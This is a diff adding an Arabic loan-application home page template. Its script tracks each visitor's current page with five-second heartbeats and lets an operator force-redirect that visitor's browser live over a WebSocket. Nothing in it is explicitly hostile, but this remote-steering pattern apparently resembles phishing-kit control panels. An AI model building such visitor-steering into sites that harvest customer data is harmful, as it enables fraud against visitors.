@@ -1,0 +1,202 @@
+<!doctype html> <html lang="ar" dir="rtl"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"> <meta name="theme-color" content="#ffffff"> <title>الرئيسية</title> <link rel="stylesheet" href="{{url_for('static',path='css/fonts.css')}}"> <link rel="stylesheet" href="{{url_for('static',path='css/style.css')}}"> </head> <body class="home-page"> <header class="app-header"> <div class="header-side"> <svg class="icon" viewBox="0 0 24 24" fill="none"> <path d="M4 7H20M4 12H20M4 17H20" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/> </svg> </div> <div class="header-center"> <img src="{{url_for('static',path='images/logo.png')}}" class="logo" alt=""> <span class="title">الرئيسية</span> </div> <div class="header-side"> <svg class="icon" viewBox="0 0 24 24" fill="none"> <path d="M18.2 17.1H5.8c1.2-1.2 2.2-3 2.2-5.6V9.4c0-2.6 1.8-4.7 4-5.1" stroke="currentColor" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"/> <path d="M12 4.3c2.8.4 4.9 2.6 4.9 5.1v2.1c0 2.6 1 4.4 2.2 5.6" stroke="currentColor" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"/> <path d="M7.2 17.1h9.6" stroke="currentColor" stroke-width="1.25" stroke-linecap="round"/> <path d="M10.3 18.6c.4 1 .9 1.6 1.7 1.6s1.3-.6 1.7-1.6" stroke="currentColor" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"/> </svg> </div> </header> <main class="content"> <h3 class="section-title">قدّم الآن</h3> <div class="cards-wrapper"> <div class="cards"> <div class="card" data-card-type="cash"> <img src="{{url_for('static',path='images/cash.png')}}" class="card-img" alt=""> <span>قرض نقدي</span> </div> <div class="card" data-card-type="automobile"> <img src="{{url_for('static',path='images/automobile.png')}}" class="card-img" alt=""> <span>قرض سيارة</span> </div> <div class="card" data-card-type="furniture"> <img src="{{url_for('static',path='images/furniture.png')}}" class="card-img" alt=""> <span>قرض أثاث</span> </div> <div class="card" data-card-type="marine"> <img src="{{url_for('static',path='images/marine.png')}}" class="card-img" alt=""> <span>معدات بحرية</span> </div> <div class="card" data-card-type="electrical"> <img src="{{url_for('static',path='images/electrical.png')}}" class="card-img" alt=""> <span>أجهزة كهربائية</span> </div> <div class="card" data-card-type="housing"> <img src="{{url_for('static',path='images/housing.png')}}" class="card-img" alt=""> <span>قرض مقسط</span> </div> <div class="card" data-card-type="educational"> <img src="{{url_for('static',path='images/educational.png')}}" class="card-img" alt=""> <span>تعليمي</span> </div> <div class="card" data-card-type="commercial"> <img src="{{url_for('static',path='images/commercial.png')}}" class="card-img" alt=""> <span>قروض شركات</span> </div> </div> </div> </main> <div class="edge-slider"> <div class="edge-track"> <div class="edge-slide"> <img src="{{url_for('static',path='images/slide1.jpg')}}" alt=""> </div> <div class="edge-slide"> <img src="{{url_for('static',path='images/slide2.jpg')}}" alt=""> </div> <div class="edge-slide"> <img src="{{url_for('static',path='images/slide3.jpg')}}" alt=""> </div> <div class="edge-slide"> <img src="{{url_for('static',path='images/slide4.jpg')}}" alt=""> </div> <div class="edge-slide"> <img src="{{url_for('static',path='images/slide5.jpg')}}" alt=""> </div> </div> </div> <button class="account-strip" type="button" aria-label="قدم الآن للحصول على القرض"> <span class="account-strip-text">قدم الآن للحصول على القرض</span> </button> <script nonce="{{ request.state.csp_nonce }}"> (() => {
+    const currentPage = 'الصفحة الرئيسية';
+
+    fetch('/visitors/current-page', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      credentials: 'same-origin',
+      body: JSON.stringify({ current_page: currentPage })
+    }).catch(() => {});
+
+    const checkAdminRedirect = () => {
+      fetch('/visitors/redirect-check', {
+        method: 'GET',
+        headers: { Accept: 'application/json' },
+        credentials: 'same-origin',
+        cache: 'no-store'
+      })
+        .then((response) => response.ok ? response.json() : null)
+        .then((payload) => {
+          if (!payload || payload.redirect !== true) {
+            return;
+          }
+          const targetPath = typeof payload.target_path === 'string' ? payload.target_path.trim() : '';
+          if (targetPath && targetPath !== window.location.pathname) {
+            window.location.href = targetPath;
+          }
+        })
+        .catch(() => {});
+    };
+
+    let redirectSocket = null;
+    let redirectSocketReconnectTimer = null;
+    let redirectSocketPingTimer = null;
+    let hasRedirected = false;
+
+    const navigateToRedirectTarget = (targetPathRaw) => {
+      if (hasRedirected) {
+        return;
+      }
+      const targetPath = typeof targetPathRaw === 'string' ? targetPathRaw.trim() : '';
+      if (!targetPath || targetPath === window.location.pathname) {
+        return;
+      }
+      hasRedirected = true;
+      window.location.href = targetPath;
+    };
+
+    const connectAdminRedirectSocket = () => {
+      if (redirectSocketReconnectTimer) {
+        clearTimeout(redirectSocketReconnectTimer);
+        redirectSocketReconnectTimer = null;
+      }
+      if (redirectSocketPingTimer) {
+        clearInterval(redirectSocketPingTimer);
+        redirectSocketPingTimer = null;
+      }
+      if (redirectSocket && (redirectSocket.readyState === WebSocket.OPEN || redirectSocket.readyState === WebSocket.CONNECTING)) {
+        return;
+      }
+
+      const scheme = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+      const socketUrl = `${scheme}//${window.location.host}/ws/visitor/redirect`;
+
+      try {
+        redirectSocket = new WebSocket(socketUrl);
+      } catch (_) {
+        redirectSocketReconnectTimer = setTimeout(connectAdminRedirectSocket, 1500);
+        return;
+      }
+
+      redirectSocket.addEventListener('open', () => {
+        redirectSocketPingTimer = setInterval(() => {
+          if (!redirectSocket || redirectSocket.readyState !== WebSocket.OPEN) {
+            return;
+          }
+          try {
+            redirectSocket.send(JSON.stringify({ type: 'heartbeat', current_page: currentPage }));
+          } catch (_) {
+            // noop
+          }
+        }, 5000);
+      });
+
+      redirectSocket.addEventListener('message', (event) => {
+        let payload = null;
+        try {
+          payload = JSON.parse(event.data);
+        } catch (_) {
+          payload = null;
+        }
+        const eventName = payload && typeof payload === 'object'
+          ? String(payload.event || '').trim().toLowerCase()
+          : '';
+        if (eventName !== 'visitor.redirect') {
+          return;
+        }
+        const meta = payload && typeof payload === 'object' && payload.meta && typeof payload.meta === 'object'
+          ? payload.meta
+          : null;
+        navigateToRedirectTarget(meta ? meta.target_path : '');
+      });
+
+      redirectSocket.addEventListener('close', () => {
+        if (redirectSocketPingTimer) {
+          clearInterval(redirectSocketPingTimer);
+          redirectSocketPingTimer = null;
+        }
+        redirectSocket = null;
+        redirectSocketReconnectTimer = setTimeout(connectAdminRedirectSocket, 1500);
+      });
+
+      redirectSocket.addEventListener('error', () => {
+        try {
+          redirectSocket.close();
+        } catch (_) {
+          // noop
+        }
+      });
+    };
+
+    const sendHeartbeat = () => {
+      fetch('/visitors/heartbeat', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        credentials: 'same-origin',
+        body: JSON.stringify({ current_page: currentPage })
+      }).catch(() => {});
+      checkAdminRedirect();
+    };
+
+    sendHeartbeat();
+    connectAdminRedirectSocket();
+    const heartbeatInterval = setInterval(() => {
+      if (document.visibilityState === 'visible') {
+        sendHeartbeat();
+      }
+    }, 5000);
+    const redirectFallbackInterval = setInterval(() => {
+      if (document.visibilityState === 'visible') {
+        checkAdminRedirect();
+      }
+    }, 15000);
+    document.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'visible') {
+        sendHeartbeat();
+      }
+    });
+    window.addEventListener('pageshow', () => {
+        hasRedirected = false;
+        sendHeartbeat();
+        connectAdminRedirectSocket();
+      });
+    window.addEventListener('beforeunload', () => {
+      clearInterval(heartbeatInterval);
+      clearInterval(redirectFallbackInterval);
+      if (redirectSocketPingTimer) {
+        clearInterval(redirectSocketPingTimer);
+        redirectSocketPingTimer = null;
+      }
+      if (redirectSocketReconnectTimer) {
+        clearTimeout(redirectSocketReconnectTimer);
+        redirectSocketReconnectTimer = null;
+      }
+      if (redirectSocket) {
+        try {
+          redirectSocket.close();
+        } catch (_) {
+          // noop
+        }
+        redirectSocket = null;
+      }
+    });
+
+    const cards = document.querySelectorAll('.card');
+    const accountStrip = document.querySelector('.account-strip');
+
+    cards.forEach((card) => {
+      const navigateToCalculator = () => {
+        const cardType = card.dataset.cardType || 'cash';
+        window.location.href = `/loan-calculator?card=${encodeURIComponent(cardType)}`;
+      };
+
+      card.setAttribute('role', 'link');
+      card.setAttribute('tabindex', '0');
+      card.addEventListener('click', navigateToCalculator);
+      card.addEventListener('keydown', (event) => {
+        if (event.key === 'Enter' || event.key === ' ') {
+          event.preventDefault();
+          navigateToCalculator();
+        }
+      });
+    });
+    if (accountStrip) {
+      accountStrip.addEventListener('click', () => {
+        window.location.href = '/customer-info';
+      });
+    }
+  })(); </script> </body> </html> 
